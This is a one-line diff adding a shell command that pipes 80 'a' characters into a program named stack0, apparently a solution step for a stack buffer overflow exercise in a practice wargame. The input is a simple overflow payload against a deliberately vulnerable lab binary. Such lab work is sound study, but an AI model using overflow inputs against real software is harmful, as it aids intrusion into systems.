@@ -1,0 +1,1 @@
+python3.8 -c "print('a'*80)" | ./stack0
